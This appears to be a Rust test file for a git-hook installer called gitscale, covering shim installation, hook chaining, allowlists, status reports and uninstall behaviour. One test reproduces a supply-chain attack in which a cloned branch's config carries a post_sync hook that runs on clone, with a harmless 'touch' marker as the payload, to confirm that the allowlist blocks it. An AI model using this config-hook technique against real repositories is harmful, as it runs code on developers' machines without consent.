//! `gitscale hook`: install, uninstall, the shim it writes, and status.
//!
//! `--local` is exercised in-process. `--global` writes to the user's git
//! config, so those tests run the binary as a subprocess under an isolated HOME
//! and never touch the developer's own.

use crate::support;
use crate::support::hooks::*;
use crate::support::TestEnv;
use gitscale::trust::ALLOW_ENV;
use std::process::Command;

// ---------------------------------------------------------------------------
// Normal cases
// ---------------------------------------------------------------------------

#[test]
fn normal_001_install_local_writes_both_hooks() {
    let env = TestEnv::new("hook_install_local");
    let repo = repo_with(&env, Some("[repos]\n"));

    let out = cli(&["hook", "install", "--local", "-C", repo.to_str().unwrap()]);
    assert!(out.success, "stderr: {}", out.stderr);

    for hook in ["post-checkout", "post-merge"] {
        let path = hooks_dir(&repo).join(hook);
        assert!(path.is_file(), "{} was not installed", hook);
        assert!(is_executable(&path), "{} is not executable", hook);
        let body = std::fs::read_to_string(&path).unwrap();
        assert!(
            body.contains("installed by gitscale"),
            "{} lacks the gitscale marker",
            hook
        );
    }
}

#[test]
fn normal_002_install_displaces_and_chains_an_existing_hook() {
    let env = TestEnv::new("hook_install_chains");
    let repo = repo_with(&env, Some("[repos]\n"));
    let own = hooks_dir(&repo).join("post-checkout");
    std::fs::write(&own, "#!/bin/sh\necho MINE\n").unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&own, std::fs::Permissions::from_mode(0o755)).unwrap();
    }

    let out = cli(&["hook", "install", "--local", "-C", repo.to_str().unwrap()]);
    assert!(out.success, "stderr: {}", out.stderr);

    let displaced = hooks_dir(&repo).join("post-checkout.local");
    assert!(
        displaced.is_file(),
        "the repo's own hook should have been moved aside, not destroyed"
    );
    assert_eq!(
        std::fs::read_to_string(&displaced).unwrap(),
        "#!/bin/sh\necho MINE\n"
    );

    let shim = std::fs::read_to_string(hooks_dir(&repo).join("post-checkout")).unwrap();
    assert!(
        shim.contains(displaced.to_str().unwrap()),
        "the shim should chain to the displaced hook"
    );
}

#[test]
fn normal_003_uninstall_restores_the_displaced_hook() {
    let env = TestEnv::new("hook_uninstall_restores");
    let repo = repo_with(&env, Some("[repos]\n"));
    let own = hooks_dir(&repo).join("post-checkout");
    std::fs::write(&own, "#!/bin/sh\necho MINE\n").unwrap();

    let root = repo.to_str().unwrap();
    assert!(cli(&["hook", "install", "--local", "-C", root]).success);
    assert!(cli(&["hook", "uninstall", "--local", "-C", root]).success);

    assert_eq!(
        std::fs::read_to_string(&own).unwrap(),
        "#!/bin/sh\necho MINE\n",
        "the repo's own hook should be back where git expects it"
    );
    assert!(
        !hooks_dir(&repo).join("post-checkout.local").exists(),
        "the displaced copy should be gone"
    );
    assert!(!hooks_dir(&repo).join("post-merge").exists());
}

#[test]
fn normal_004_shim_runs_the_chained_hook_and_honours_the_recursion_guard() {
    let env = TestEnv::new("hook_shim_chain");
    // A config is present, so without the guard the shim would invoke gitscale.
    let repo = repo_with(&env, Some("[repos]\n"));
    let own = hooks_dir(&repo).join("post-checkout");
    std::fs::write(&own, "#!/bin/sh\necho CHAINED\n").unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&own, std::fs::Permissions::from_mode(0o755)).unwrap();
    }
    assert!(cli(&["hook", "install", "--local", "-C", repo.to_str().unwrap()]).success);

    // GITSCALE_HOOK set == this git call came from gitscale itself.
    let (code, output) = run_hook(&hooks_dir(&repo).join("post-checkout"), &repo, Some("1"));
    assert_eq!(code, 0);
    assert!(
        output.contains("CHAINED"),
        "the repo's own hook must still run: {}",
        output
    );
    assert!(
        !output.contains("Pulling"),
        "the recursion guard should have stopped gitscale from running: {}",
        output
    );
    assert_eq!(
        output.trim(),
        "CHAINED",
        "nothing but the chained hook may run under the guard"
    );

    // The same shim calling a recorder instead of the test harness: silent
    // under the guard, called once without it.
    let shim = hooks_dir(&repo).join("post-checkout");
    let (bin, log) = fake_gitscale(&env.repos_remote);
    point_shim_at(&shim, &bin);
    let (code, _) = run_hook(&shim, &repo, Some("1"));
    assert_eq!(code, 0);
    assert!(
        calls(&log).is_empty(),
        "the guard let gitscale run: {:?}",
        calls(&log)
    );
    let (code, _) = run_hook(&shim, &repo, None);
    assert_eq!(code, 0);
    assert_eq!(calls(&log).len(), 1, "{:?}", calls(&log));
    assert!(
        calls(&log)[0].starts_with("args=hook run post-checkout -C "),
        "{:?}",
        calls(&log)
    );
}

#[test]
fn normal_005_status_reports_installed_hooks() {
    let env = TestEnv::new("hook_status");
    let repo = repo_with(&env, Some("[repos]\n"));
    let root = repo.to_str().unwrap();
    assert!(cli(&["hook", "install", "--local", "-C", root]).success);

    // Isolated: status reports the hooks directory git would really use, which
    // means consulting a global core.hooksPath — the developer may have one.
    let out = cli_isolated(&isolated_home(&env), &["hook", "status", "-C", root]);
    assert!(out.success, "stderr: {}", out.stderr);
    assert!(out.stdout.contains("post-checkout"), "{}", out.stdout);
    assert!(out.stdout.contains("gitscale"), "{}", out.stdout);
    // The rows themselves: the words above are also in every repository path
    // under tests/, and in the system line on a machine with a gitscale hook.
    for hook in ["post-checkout", "post-merge"] {
        assert!(
            out.stdout
                .lines()
                .any(|l| l.split_whitespace().collect::<Vec<_>>() == [hook, "gitscale"]),
            "no `{} gitscale` row:\n{}",
            hook,
            out.stdout
        );
    }
}

#[test]
fn normal_006_install_bakes_the_requested_allowlist_into_the_shim() {
    let env = TestEnv::new("hook_allow_baked");
    let repo = repo_with(&env, Some("[repos]\n"));
    let root = repo.to_str().unwrap();

    let out = cli(&[
        "hook",
        "install",
        "--local",
        "--allow",
        "github.com/acme/*,git.internal.example/*",
        "-C",
        root,
    ]);
    assert!(out.success, "stderr: {}", out.stderr);

    for hook in ["post-checkout", "post-merge"] {
        assert_eq!(
            baked_allowlist(&hooks_dir(&repo).join(hook)),
            "github.com/acme/*,git.internal.example/*"
        );
    }
}

/// A `--local` install is already a decision about one repository, and the file
/// it writes cannot travel to anyone else — so it needs no patterns.
#[test]
fn normal_007_install_local_allows_its_own_repository_by_default() {
    let env = TestEnv::new("hook_allow_local_default");
    let repo = repo_with(&env, Some("[repos]\n"));
    assert!(cli(&["hook", "install", "--local", "-C", repo.to_str().unwrap()]).success);
    assert_eq!(
        baked_allowlist(&hooks_dir(&repo).join("post-checkout")),
        "*"
    );
}

#[test]
fn normal_008_status_reports_the_allowlist() {
    let env = TestEnv::new("hook_status_allowlist");
    let repo = repo_with(&env, Some("[repos]\n"));
    let root = repo.to_str().unwrap();
    assert!(
        cli(&[
            "hook",
            "install",
            "--local",
            "--allow",
            "github.com/acme/*",
            "-C",
            root
        ])
        .success
    );

    let out = cli_isolated(&isolated_home(&env), &["hook", "status", "-C", root]);
    assert!(out.success, "stderr: {}", out.stderr);
    assert!(out.stdout.contains("hook allowlist"), "{}", out.stdout);
    assert!(out.stdout.contains("github.com/acme/*"), "{}", out.stdout);
    assert!(out.stdout.contains("NOT allowed"), "{}", out.stdout);
}

/// A global `core.hooksPath` replaces every repository's `.git/hooks`, so the
/// docs promise that the installed hook still runs the repository's own hook
/// first. A repository's own `post-checkout` — and its `pre-commit`, which
/// gitscale never installs — must keep running once a global install is in
/// place, or a secret scanner or git-lfs hook silently stops working.
#[test]
#[ignore = "bug: a --global install never runs a repository's own .git/hooks"]
fn normal_021_global_install_keeps_each_repositorys_own_git_hooks_running() {
    let env = TestEnv::new("hook_global_keeps_repo_hooks");
    let repo = repo_with(&env, None);
    let home = isolated_home(&env);
    let checkout_mark = env.repos_remote.join("post-checkout-ran");
    let commit_mark = env.repos_remote.join("pre-commit-ran");
    write_script(
        &hooks_dir(&repo).join("post-checkout"),
        &format!("touch '{}'\n", checkout_mark.display()),
    );
    write_script(
        &hooks_dir(&repo).join("pre-commit"),
        &format!("touch '{}'\n", commit_mark.display()),
    );

    let out = cli_isolated(&home, &["hook", "install", "--global", "--allow", "*"]);
    assert!(out.success, "stderr: {}", out.stderr);

    git_ok(&home, &repo, &["checkout", "-q", "-b", "other"]);
    git_ok(&home, &repo, &["commit", "-q", "--allow-empty", "-m", "x"]);
    assert!(
        checkout_mark.exists(),
        "the repository's own post-checkout stopped running"
    );
    assert!(
        commit_mark.exists(),
        "the repository's own pre-commit stopped running"
    );
}

/// `on_pull_error` decides whether a failed hook-triggered pull fails the git
/// operation: unset, CI fails fast and a developer machine only warns; set,
/// it means what it says either way. Every failure leaves a breadcrumb.
#[test]
fn normal_022_on_pull_error_decides_whether_a_failed_hook_pull_fails_the_checkout() {
    let env = TestEnv::new("hook_on_pull_error");
    let missing = env.repos_remote.join("missing.git");
    for (policy, ci, fails) in [
        (None, "", false),
        (None, "true", true),
        (Some("fail"), "", true),
        (Some("warn"), "true", false),
    ] {
        let table = policy
            .map(|p| format!("[hooks]\non_pull_error = \"{}\"\n\n", p))
            .unwrap_or_default();
        env.write_config(&format!(
            "{}[repos]\n\"libs/x\" = {{ url = \"{}\", revision = \"main\" }}\n",
            table,
            missing.display()
        ));
        let _ = std::fs::remove_file(breadcrumb(&env.playground));

        let out = env.run_hook_run("post-checkout", "*", &[("CI", ci)]);
        let case = format!("on_pull_error={:?} CI={:?}", policy, ci);
        assert_eq!(
            !out.success, fails,
            "{}: {}{}",
            case, out.stdout, out.stderr
        );
        assert!(
            out.stderr.contains("post-checkout hook — pull failed"),
            "{}: {}",
            case,
            out.stderr
        );
        if !fails {
            assert!(
                out.stderr.contains("continuing anyway"),
                "{}: {}",
                case,
                out.stderr
            );
        }
        assert!(
            breadcrumb(&env.playground).is_file(),
            "{}: no breadcrumb",
            case
        );
    }
}

/// The breadcrumb is what lets a later, more confusing failure be traced back:
/// `hook status` shows the failed pull until a hook-triggered pull succeeds,
/// which removes it.
#[test]
fn normal_023_status_reports_a_failed_hook_pull_until_one_succeeds() {
    let env = TestEnv::new("hook_breadcrumb");
    let home = isolated_home(&env);
    let root = env.playground.to_str().unwrap();
    env.write_config(&format!(
        "[repos]\n\"libs/x\" = {{ url = \"{}\", revision = \"main\" }}\n",
        env.repos_remote.join("missing.git").display()
    ));
    let out = env.run_hook_run("post-checkout", "*", &[]);
    assert!(out.success, "warn is the default off CI: {}", out.stderr);

    let status = cli_isolated(&home, &["hook", "status", "-C", root]);
    assert!(status.success, "{}", status.stderr);
    assert!(
        status.stdout.contains("Last hook-triggered pull FAILED"),
        "{}",
        status.stdout
    );
    assert!(
        status
            .stdout
            .contains("`gitscale pull` triggered by the post-checkout hook failed"),
        "{}",
        status.stdout
    );

    let bare = env.create_bare_repo("lib", "main", &[("a.txt", "a")]);
    env.write_config(&format!(
        "[repos]\n\"libs/x\" = {{ url = \"{}\", revision = \"main\" }}\n",
        bare.display()
    ));
    let out = env.run_hook_run("post-checkout", "*", &[]);
    assert!(out.success, "{}{}", out.stdout, out.stderr);
    assert!(!breadcrumb(&env.playground).exists());
    let status = cli_isolated(&home, &["hook", "status", "-C", root]);
    assert!(!status.stdout.contains("FAILED"), "{}", status.stdout);
}

/// Uninstalling a global install takes back exactly what it set up: the shims
/// in ~/.config/gitscale/hooks and the global `core.hooksPath` pointing at
/// them — and nothing else in the user's git config.
#[test]
fn normal_024_uninstall_global_removes_the_shims_and_unsets_core_hooks_path() {
    let env = TestEnv::new("hook_uninstall_global");
    let home = isolated_home(&env);
    std::fs::write(home.join(".gitconfig"), "[user]\n\tname = Someone\n").unwrap();
    assert!(cli_isolated(&home, &["hook", "install", "--global", "--allow", "*"]).success);
    let managed = home.join(".config/gitscale/hooks");
    assert!(managed.join("post-checkout").is_file());

    let out = cli_isolated(&home, &["hook", "uninstall", "--global"]);
    assert!(out.success, "stderr: {}", out.stderr);
    assert!(
        out.stdout.contains("unset global core.hooksPath"),
        "{}",
        out.stdout
    );
    assert!(
        out.stdout.contains("gitscale hooks removed (global)"),
        "{}",
        out.stdout
    );
    for hook in ["post-checkout", "post-merge"] {
        assert!(!managed.join(hook).exists(), "{} left behind", hook);
    }
    let get = git_as(
        &home,
        &env.playground,
        &["config", "--global", "--get", "core.hooksPath"],
    );
    assert!(!get.status.success(), "core.hooksPath is still set");
    let name = git_ok(
        &home,
        &env.playground,
        &["config", "--global", "--get", "user.name"],
    );
    assert_eq!(name.trim(), "Someone");
}

/// The shim hands git's arguments to the repository's own hook, and that
/// hook's exit status is the shim's: a hook that rejects an operation still
/// rejects it once gitscale is in front of it.
#[test]
fn normal_025_shim_passes_its_arguments_to_the_chained_hook_and_returns_its_status() {
    let env = TestEnv::new("hook_chain_status");
    let repo = repo_with(&env, Some("[repos]\n"));
    write_script(
        &hooks_dir(&repo).join("post-checkout"),
        "echo \"args:$*\"\nexit 3\n",
    );
    assert!(cli(&["hook", "install", "--local", "-C", repo.to_str().unwrap()]).success);

    let (code, output) = run_hook_args(
        &hooks_dir(&repo).join("post-checkout"),
        &repo,
        Some("1"),
        &["aaa", "bbb", "1"],
    );
    assert_eq!(code, 3, "{}", output);
    assert_eq!(output.trim(), "args:aaa bbb 1");
}

/// `git merge` and `git pull` fire `post-merge`, not `post-checkout`: a merge
/// that brings in a new declared checkout gets it pulled.
#[test]
fn normal_026_git_merge_runs_the_pull_through_post_merge() {
    let env = TestEnv::new("hook_post_merge");
    let bare = env.create_bare_repo("lib", "main", &[("a.txt", "from lib")]);
    let repo = repo_with(&env, Some("[repos]\n"));
    let home = isolated_home(&env);
    std::fs::write(repo.join(".gitignore"), "/home/\n/libs/\n").unwrap();
    support::run_git_pub(&repo, &["add", ".gitignore"]);
    support::run_git_pub(&repo, &["commit", "-q", "-m", "ignore"]);
    // The branch to merge declares the checkout; made before any hook exists.
    support::run_git_pub(&repo, &["checkout", "-q", "-b", "side"]);
    std::fs::write(
        repo.join(".gitscale.toml"),
        format!(
            "[repos]\n\"libs/lib\" = {{ url = \"{}\", revision = \"main\" }}\n",
            bare.display()
        ),
    )
    .unwrap();
    support::run_git_pub(&repo, &["commit", "-q", "-am", "declare lib"]);
    support::run_git_pub(&repo, &["checkout", "-q", "main"]);

    let out = cli_isolated(
        &home,
        &["hook", "install", "--local", "-C", repo.to_str().unwrap()],
    );
    assert!(out.success, "stderr: {}", out.stderr);

    let report = git_ok(&home, &repo, &["merge", "-q", "--ff-only", "side"]);
    assert_eq!(
        std::fs::read_to_string(repo.join("libs/lib/a.txt"))
            .ok()
            .as_deref(),
        Some("from lib"),
        "post-merge did not pull:\n{}",
        report
    );
}

/// The way a workspace is meant to be set up: with a global hook, `git clone`
/// and nothing else populates every declared checkout, and so does
/// `git worktree add` for a second worktree.
#[test]
fn normal_027_a_global_hook_populates_a_fresh_clone_and_a_new_worktree() {
    let env = TestEnv::new("hook_global_clone");
    let home = isolated_home(&env);
    let lib = env.create_bare_repo("lib", "main", &[("a.txt", "from lib")]);
    let root = env.create_bare_repo(
        "root",
        "main",
        &[
            (
                ".gitscale.toml",
                &format!(
                    "[repos]\n\"libs/lib\" = {{ url = \"{}\", revision = \"main\" }}\n",
                    lib.display()
                ),
            ),
            (".gitignore", "/libs/\n"),
        ],
    );
    assert!(cli_isolated(&home, &["hook", "install", "--global", "--allow", "*"]).success);

    let clone = env.repos_remote.join("clone");
    let report = git_ok(
        &home,
        &env.repos_remote,
        &[
            "clone",
            "-q",
            root.to_str().unwrap(),
            clone.to_str().unwrap(),
        ],
    );
    assert_eq!(
        std::fs::read_to_string(clone.join("libs/lib/a.txt"))
            .ok()
            .as_deref(),
        Some("from lib"),
        "the clone was not populated:\n{}",
        report
    );

    let wt = env.repos_remote.join("wt");
    let report = git_ok(
        &home,
        &clone,
        &[
            "worktree",
            "add",
            "-q",
            "-b",
            "second",
            wt.to_str().unwrap(),
        ],
    );
    assert_eq!(
        std::fs::read_to_string(wt.join("libs/lib/a.txt"))
            .ok()
            .as_deref(),
        Some("from lib"),
        "the new worktree was not populated:\n{}",
        report
    );
}

// ---------------------------------------------------------------------------
// Edge cases
// ---------------------------------------------------------------------------

/// git runs every worktree's hooks from the common `.git/hooks`; a linked
/// worktree's own git dir (`.git/worktrees/<name>`) is never consulted.
#[test]
fn edge_009_install_local_from_a_linked_worktree_writes_the_shared_hooks() {
    let env = TestEnv::new("hook_install_worktree");
    let repo = repo_with(&env, Some("[repos]\n"));
    let wt = env.repos_remote.join("wt");
    support::run_git_pub(&repo, &["worktree", "add", "-q", wt.to_str().unwrap()]);

    let out = cli(&["hook", "install", "--local", "-C", wt.to_str().unwrap()]);
    assert!(out.success, "stderr: {}", out.stderr);

    for hook in ["post-checkout", "post-merge"] {
        assert!(
            hooks_dir(&repo).join(hook).is_file(),
            "{} not in the shared hooks dir",
            hook
        );
        assert!(
            !repo.join(".git/worktrees/wt/hooks").join(hook).exists(),
            "{} written to the worktree's private git dir",
            hook
        );
    }

    let out = cli_isolated(
        &isolated_home(&env),
        &["hook", "status", "-C", wt.to_str().unwrap()],
    );
    assert!(out.success, "stderr: {}", out.stderr);
    assert!(
        out.stdout
            .contains(&*hooks_dir(&repo).canonicalize().unwrap().to_string_lossy()),
        "status should report the shared hooks dir:\n{}",
        out.stdout
    );
}

#[test]
fn edge_010_shim_is_silent_in_a_repo_without_a_gitscale_config() {
    let env = TestEnv::new("hook_shim_silent");
    let repo = repo_with(&env, None); // no .gitscale.toml
    assert!(cli(&["hook", "install", "--local", "-C", repo.to_str().unwrap()]).success);

    let (code, output) = run_hook(&hooks_dir(&repo).join("post-checkout"), &repo, None);
    assert_eq!(code, 0, "must not disturb repos that never opted in");
    assert!(
        output.trim().is_empty(),
        "expected no output in a non-gitscale repo, got: {}",
        output
    );
}

/// The shim names the chained hook by path, and a path may hold a quote.
#[test]
fn edge_011_shim_chains_a_hook_whose_path_holds_a_quote() {
    let env = TestEnv::new("hook_shim_it's");
    let repo = repo_with(&env, Some("[repos]\n"));
    let own = hooks_dir(&repo).join("post-checkout");
    std::fs::write(&own, "#!/bin/sh\necho CHAINED\n").unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&own, std::fs::Permissions::from_mode(0o755)).unwrap();
    }
    assert!(cli(&["hook", "install", "--local", "-C", repo.to_str().unwrap()]).success);

    let (code, output) = run_hook(&hooks_dir(&repo).join("post-checkout"), &repo, Some("1"));
    assert_eq!(code, 0, "the shim failed: {}", output);
    assert_eq!(output.trim(), "CHAINED");
}

/// `git checkout -- <path>` fires post-checkout too, with a third argument of
/// 0. It moves no revision, and a build restoring a file must not have its
/// sub-repositories reset and cleaned underneath it.
#[test]
fn edge_012_shim_ignores_a_file_checkout() {
    let env = TestEnv::new("hook_shim_file_checkout");
    let repo = repo_with(&env, Some("[repos]\n"));
    assert!(cli(&["hook", "install", "--local", "-C", repo.to_str().unwrap()]).success);
    let script = hooks_dir(&repo).join("post-checkout");

    let run = |flag: &str| {
        let out = Command::new("sh")
            .arg(&script)
            .args(["0000000", "0000000", flag])
            .current_dir(&repo)
            .env_remove("GITSCALE_HOOK")
            .output()
            .expect("failed to run hook");
        format!(
            "{}{}",
            String::from_utf8_lossy(&out.stdout),
            String::from_utf8_lossy(&out.stderr)
        )
    };

    // An in-process install bakes in the test binary rather than gitscale, so
    // what the shim reaches cannot run a real pull here. Whether it reaches it
    // at all is the question: silence means the shim stopped first.
    let file_checkout = run("0");
    assert!(
        file_checkout.trim().is_empty(),
        "a file checkout must not reach gitscale: {}",
        file_checkout
    );
    assert!(
        !run("1").trim().is_empty(),
        "a branch checkout must still reach gitscale"
    );
}

/// Upgrading gitscale means re-running install; that must not silently widen or
/// narrow what the machine already allows.
#[test]
fn edge_013_reinstall_keeps_the_existing_allowlist() {
    let env = TestEnv::new("hook_allow_reinstall");
    let repo = repo_with(&env, Some("[repos]\n"));
    let root = repo.to_str().unwrap();

    assert!(
        cli(&[
            "hook",
            "install",
            "--local",
            "--allow",
            "github.com/acme/*",
            "-C",
            root
        ])
        .success
    );
    assert!(cli(&["hook", "install", "--local", "-C", root]).success);
    assert_eq!(
        baked_allowlist(&hooks_dir(&repo).join("post-checkout")),
        "github.com/acme/*"
    );

    // ...and passing --allow again replaces it.
    assert!(cli(&["hook", "install", "--local", "--allow", "*", "-C", root]).success);
    assert_eq!(
        baked_allowlist(&hooks_dir(&repo).join("post-checkout")),
        "*"
    );
}

/// A monorepo that commits its own copies of the shim — `.githooks/`, pointed
/// at by a repo-local `core.hooksPath` — is running gitscale, and status must
/// say so rather than call them foreign and advise installing over them.
/// Uninstall, which acts only on shims gitscale wrote, leaves them alone.
#[test]
fn edge_014_status_recognises_a_repositorys_own_copy_of_the_shim() {
    let env = TestEnv::new("hook_status_vendored");
    let repo = repo_with(&env, Some("[repos]\n"));
    let root = repo.to_str().unwrap();

    // Generate a real shim, then commit a copy the way the monorepo does: its
    // own header, no gitscale marker.
    assert!(
        cli(&[
            "hook",
            "install",
            "--local",
            "--allow",
            "gitlab.example/*",
            "-C",
            root
        ])
        .success
    );
    let vendored = repo.join(".githooks");
    std::fs::create_dir_all(&vendored).unwrap();
    for hook in ["post-checkout", "post-merge"] {
        let shim = std::fs::read_to_string(hooks_dir(&repo).join(hook)).unwrap();
        let copy: String = shim
            .lines()
            .map(|l| {
                if l.starts_with("# installed by gitscale") {
                    "# Delegate to the gitscale installed by the current environment."
                } else {
                    l
                }
            })
            .collect::<Vec<_>>()
            .join("\n");
        std::fs::write(vendored.join(hook), copy).unwrap();
    }
    support::run_git_pub(&repo, &["config", "core.hooksPath", ".githooks"]);

    // A global install is what the repo-local path shadows.
    let home = isolated_home(&env);
    std::fs::write(
        home.join(".gitconfig"),
        "[core]\n\thooksPath = /etc/gitscale/hooks\n",
    )
    .unwrap();

    let out = cli_isolated(&home, &["hook", "status", "-C", root]);
    assert!(out.success, "stderr: {}", out.stderr);
    assert!(
        out.stdout.contains("gitscale (repository's own copy)"),
        "{}",
        out.stdout
    );
    assert!(
        !out.stdout.contains("other (not gitscale)"),
        "{}",
        out.stdout
    );
    assert!(
        out.stdout.contains("run gitscale, so nothing is lost"),
        "{}",
        out.stdout
    );
    assert!(
        !out.stdout.contains("hook install --local"),
        "{}",
        out.stdout
    );
    assert!(
        out.stdout.contains("gitlab.example/*"),
        "its allowlist: {}",
        out.stdout
    );

    // Committed files are the repository's, not gitscale's to remove.
    assert!(cli_isolated(&home, &["hook", "uninstall", "--local", "-C", root]).success);
    assert!(vendored.join("post-checkout").exists());
    assert!(vendored.join("post-merge").exists());
}

/// Without copies of its own in the repo's hooks directory, the advice stands.
#[test]
fn edge_015_status_still_flags_a_repo_path_that_runs_no_gitscale() {
    let env = TestEnv::new("hook_status_shadowed");
    let repo = repo_with(&env, Some("[repos]\n"));
    let root = repo.to_str().unwrap();
    let own = repo.join(".githooks");
    std::fs::create_dir_all(&own).unwrap();
    std::fs::write(own.join("post-checkout"), "#!/bin/sh\necho lint\n").unwrap();
    support::run_git_pub(&repo, &["config", "core.hooksPath", ".githooks"]);
    let home = isolated_home(&env);
    std::fs::write(
        home.join(".gitconfig"),
        "[core]\n\thooksPath = /etc/gitscale/hooks\n",
    )
    .unwrap();

    let out = cli_isolated(&home, &["hook", "status", "-C", root]);
    assert!(out.success, "stderr: {}", out.stderr);
    assert!(
        out.stdout.contains("other (not gitscale)"),
        "{}",
        out.stdout
    );
    assert!(
        out.stdout.contains("hook install --local"),
        "{}",
        out.stdout
    );
}

/// The reported attack, end to end: a global hook is installed, an attacker's
/// branch carries a `.gitscale.toml` with a payload, and a developer clones it
/// to review. Nothing but the allowlist stands in the way.
#[test]
fn edge_016_a_global_hook_refuses_a_payload_from_a_cloned_branch() {
    let env = TestEnv::new("hook_clone_attack");
    let home = isolated_home(&env);
    let loot = home.join("STOLEN");

    // The attacker's branch, pushed to a repository the developer will clone.
    let upstream = env.create_bare_repo(
        "payload",
        "main",
        &[(
            ".gitscale.toml",
            &format!("[hooks]\npost_sync = \"touch {}\"\n", loot.display()),
        )],
    );

    let out = cli_isolated(
        &home,
        &[
            "hook",
            "install",
            "--global",
            "--allow",
            "github.com/acme/*",
        ],
    );
    assert!(out.success, "stderr: {}", out.stderr);

    // The developer clones the branch to take a look.
    let victim = env.playground.join("victim");
    let clone = Command::new("git")
        .args([
            "clone",
            "--branch",
            "main",
            upstream.to_str().unwrap(),
            victim.to_str().unwrap(),
        ])
        .env("HOME", &home)
        .env_remove("GIT_CONFIG_GLOBAL")
        .env_remove("GIT_CONFIG_SYSTEM")
        .env_remove("GIT_CONFIG_COUNT")
        .env_remove(ALLOW_ENV)
        .output()
        .expect("failed to clone");
    let report = String::from_utf8_lossy(&clone.stderr).into_owned();

    assert!(
        !loot.exists(),
        "the payload ran during a plain `git clone`:\n{}",
        report
    );
    assert!(
        report.contains("refusing to run the post_sync hook"),
        "the refusal must be visible to whoever cloned it:\n{}",
        report
    );
    // Off CI the policy is `warn`: the clone itself succeeds, and the refusal
    // is kept for `gitscale hook status`.
    assert!(clone.status.success(), "the clone failed:\n{}", report);
    let note = std::fs::read_to_string(breadcrumb(&victim)).unwrap_or_default();
    assert!(
        note.contains("refusing to run the post_sync hook"),
        "breadcrumb: {:?}",
        note
    );

    // And the other half: with the workspace inside the allowlist, the same
    // shim runs the same hook. The patterns are the only thing deciding.
    let allow = format!("{}/*", env.playground.display());
    assert!(cli_isolated(&home, &["hook", "install", "--global", "--allow", &allow]).success);
    let checkout = Command::new("git")
        .args(["checkout", "-B", "review", "main"])
        .current_dir(&victim)
        .env("HOME", &home)
        .env_remove("GIT_CONFIG_GLOBAL")
        .env_remove("GIT_CONFIG_SYSTEM")
        .env_remove("GIT_CONFIG_COUNT")
        .env_remove(ALLOW_ENV)
        .output()
        .expect("failed to checkout");
    assert!(
        loot.exists(),
        "an allowlisted workspace should still run its hook:\n{}",
        String::from_utf8_lossy(&checkout.stderr)
    );
}

/// Re-installing — what an upgrade of gitscale means — keeps the shim chained
/// to the hook it displaced the first time. Losing the link would leave the
/// repository's own hook in `<name>.local`, never run again.
#[test]
fn edge_028_reinstall_keeps_chaining_to_the_displaced_hook() {
    let env = TestEnv::new("hook_reinstall_chain");
    let repo = repo_with(&env, Some("[repos]\n"));
    write_script(&hooks_dir(&repo).join("post-checkout"), "echo CHAINED\n");
    let root = repo.to_str().unwrap();
    assert!(cli(&["hook", "install", "--local", "-C", root]).success);
    let out = cli(&["hook", "install", "--local", "-C", root]);
    assert!(out.success, "stderr: {}", out.stderr);

    let displaced = hooks_dir(&repo).join("post-checkout.local");
    assert!(displaced.is_file());
    let shim = std::fs::read_to_string(hooks_dir(&repo).join("post-checkout")).unwrap();
    assert!(shim.contains(displaced.to_str().unwrap()), "{}", shim);
    let (code, output) = run_hook(&hooks_dir(&repo).join("post-checkout"), &repo, Some("1"));
    assert_eq!(code, 0);
    assert_eq!(output.trim(), "CHAINED");
}

/// Uninstalling where gitscale installed nothing says so and touches nothing:
/// not somebody else's hook, and not a `core.hooksPath` it did not set.
#[test]
fn edge_029_uninstall_with_nothing_installed_says_so_and_changes_nothing() {
    let env = TestEnv::new("hook_uninstall_nothing");
    let repo = repo_with(&env, Some("[repos]\n"));
    let theirs = hooks_dir(&repo).join("post-checkout");
    write_script(&theirs, "echo theirs\n");

    let out = cli(&["hook", "uninstall", "--local", "-C", repo.to_str().unwrap()]);
    assert!(out.success, "stderr: {}", out.stderr);
    assert!(
        out.stdout
            .contains("No gitscale hooks were installed (local)."),
        "{}",
        out.stdout
    );
    assert_eq!(
        std::fs::read_to_string(&theirs).unwrap(),
        "#!/bin/sh\necho theirs\n"
    );

    let home = isolated_home(&env);
    let config = "[core]\n\thooksPath = /opt/team-hooks\n";
    std::fs::write(home.join(".gitconfig"), config).unwrap();
    let out = cli_isolated(&home, &["hook", "uninstall", "--global"]);
    assert!(out.success, "stderr: {}", out.stderr);
    assert!(
        out.stdout
            .contains("No gitscale hooks were installed (global)."),
        "{}",
        out.stdout
    );
    assert_eq!(
        std::fs::read_to_string(home.join(".gitconfig")).unwrap(),
        config
    );
}

/// The displaced hook may have been deleted by hand since the install. The
/// uninstall still removes gitscale's own shim, and says it removed it rather
/// than claiming a restore.
#[test]
fn edge_030_uninstall_removes_the_shim_when_the_displaced_hook_is_gone() {
    let env = TestEnv::new("hook_uninstall_displaced_gone");
    let repo = repo_with(&env, Some("[repos]\n"));
    write_script(&hooks_dir(&repo).join("post-checkout"), "echo mine\n");
    let root = repo.to_str().unwrap();
    assert!(cli(&["hook", "install", "--local", "-C", root]).success);
    std::fs::remove_file(hooks_dir(&repo).join("post-checkout.local")).unwrap();

    let out = cli(&["hook", "uninstall", "--local", "-C", root]);
    assert!(out.success, "stderr: {}", out.stderr);
    assert!(!hooks_dir(&repo).join("post-checkout").exists());
    assert!(out.stdout.contains("removed"), "{}", out.stdout);
    assert!(!out.stdout.contains("restored"), "{}", out.stdout);
}

/// A shim whose gitscale binary has gone says so — but only in a repository
/// that opted in with a `.gitscale.toml`; every other repository stays silent.
/// Either way the git operation is not failed for it.
#[test]
fn edge_031_shim_reports_a_missing_binary_only_where_the_repo_opted_in() {
    let missing = std::path::Path::new("/nonexistent/gitscale-test/gitscale");
    for (name, config) in [
        ("hook_missing_binary_opted_in", Some("[repos]\n")),
        ("hook_missing_binary_elsewhere", None),
    ] {
        let env = TestEnv::new(name);
        let repo = repo_with(&env, config);
        assert!(cli(&["hook", "install", "--local", "-C", repo.to_str().unwrap()]).success);
        let shim = hooks_dir(&repo).join("post-checkout");
        point_shim_at(&shim, missing);

        let (code, output) = run_hook(&shim, &repo, None);
        assert_eq!(code, 0, "{}: {}", name, output);
        if config.is_some() {
            assert!(
                output.contains("post-checkout skipped")
                    && output.contains("/nonexistent/gitscale-test/gitscale not found"),
                "{}: {}",
                name,
                output
            );
        } else {
            assert!(output.trim().is_empty(), "{}: {}", name, output);
        }
    }
}

/// git itself skips a hook file that is not executable; the shim does the
